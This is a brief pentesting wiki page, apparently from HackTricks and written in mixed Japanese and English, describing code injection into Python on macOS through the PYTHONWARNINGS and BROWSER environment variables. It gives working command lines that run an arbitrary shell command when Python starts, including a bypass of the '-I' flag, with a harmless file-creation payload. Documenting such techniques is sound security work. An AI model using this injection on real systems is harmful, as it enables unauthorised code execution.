# macOS Python Applications Injection

{{#include ../../../banners/hacktricks-training.md}}

## `PYTHONWARNINGS` と `BROWSER` env variables を介した方法

Python が呼び出されるたびに arbitrary code を実行するよう、両方の environment variables を変更できます。例：<sup>[[1]](#references)</sup>
```bash
# Generate example python script
echo "print('hi')" > /tmp/script.py

# RCE which will generate file /tmp/hacktricks
PYTHONWARNINGS="all:0:antigravity.x:0:0" BROWSER="/bin/sh -c 'touch /tmp/hacktricks' #%s" python3 /tmp/script.py

# RCE which will generate file /tmp/hacktricks bypassing "-I" injecting "-W" before the script to execute
BROWSER="/bin/sh -c 'touch /tmp/hacktricks' #%s" python3 -I -W all:0:antigravity.x:0:0 /tmp/script.py
```
## 参考資料

- [1] [環境変数を使ったHacking - elttam](https://www.elttam.com/blog/env/)

{{#include ../../../banners/hacktricks-training.md}}
